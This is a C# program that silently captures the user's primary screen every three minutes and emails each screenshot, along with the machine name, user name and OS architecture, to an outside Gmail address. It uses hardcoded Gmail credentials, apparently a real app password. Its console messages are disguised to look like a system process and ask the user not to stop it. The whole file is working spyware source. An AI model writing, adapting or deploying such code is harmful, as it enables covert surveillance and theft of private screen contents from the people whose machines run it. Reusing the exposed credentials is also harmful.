using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using System.Net.Mail;
using System.Timers; // Inclui o namespace System.Timers
using System.Windows.Forms;

class Program
{
    private static System.Timers.Timer _timer; // Usando System.Timers.Timer explicitamente
    private const string GmailUsername = "macksoupletter@gmail.com";
    private const string GmailPassword = "nofe ettp hxvf mqqp";
    private const string RecipientEmail = "bashlover142@gmail.com";
    private const int IntervalMinutes = 3;
    private static string _screenshotPath = "screenshot.png";
    private static string _machineName = Environment.MachineName;
    private static string _userName = Environment.UserName; // Obtém o nome do usuário
    private static string _processorArchitecture = Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit"; // Obtém a arquitetura do processador

    [STAThread]
    static void Main()
    {
        // Configura o timer
        _timer = new System.Timers.Timer(IntervalMinutes * 60 * 1000); // Intervalo em milissegundos
        _timer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
        _timer.AutoReset = true;
        _timer.Enabled = true;

        // Mantém o aplicativo em execução
        Console.WriteLine("StartWindowsMethod - (please dont stop this programm) - Exception: VOID MAIN():");
        Console.ReadLine();
    }

    private static void OnTimedEvent(object source, ElapsedEventArgs e)
    {
        try
        {
            // Captura da tela
            Bitmap screenshot = CaptureScreen();
            screenshot.Save(_screenshotPath, ImageFormat.Png);

            // Envia o e-mail
            SendEmailWithAttachment(_screenshotPath);
            Console.WriteLine("SYSADMIN_WININIT " + DateTime.Now.ToString() + " da máquina " + _machineName);
        }
        catch (Exception ex)
        {
            Console.WriteLine("COMPERROR " + ex.Message);
        }
    }

    static Bitmap CaptureScreen()
    {
        // Obtém a dimensão da tela principal
        Rectangle bounds = Screen.PrimaryScreen.Bounds;

        // Cria uma imagem para a captura
        Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);

        // Captura a tela
        using (Graphics g = Graphics.FromImage(bitmap))
        {
            g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
        }

        return bitmap;
    }

    static void SendEmailWithAttachment(string attachmentPath)
    {
        try
        {
            using (MailMessage mail = new MailMessage())
            {
                mail.From = new MailAddress(GmailUsername);
                mail.To.Add(RecipientEmail);
                mail.Subject = "Captura de Tela - " + _machineName + " - " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

                // Corpo do e-mail com concatenação
                string body = "Olá,\n\n";
                body += "Segue em anexo a captura de tela tirada em " + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + " da máquina " + _machineName + ".\n\n";
                body += "Informações do sistema:\n";
                body += "Nome do Usuário: " + _userName + "\n";
                body += "Arquitetura do Processador: " + _processorArchitecture + "\n\n";
                body += "Atenciosamente,\n";
                body += "Seu Sistema";

                mail.Body = body;

                Attachment attachment = new Attachment(attachmentPath);
                mail.Attachments.Add(attachment);

                using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
                {
                    smtp.Credentials = new NetworkCredential(GmailUsername, GmailPassword);
                    smtp.EnableSsl = true;
                    smtp.Send(mail);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("ERROR202 " + ex.Message);
        }
    }
}
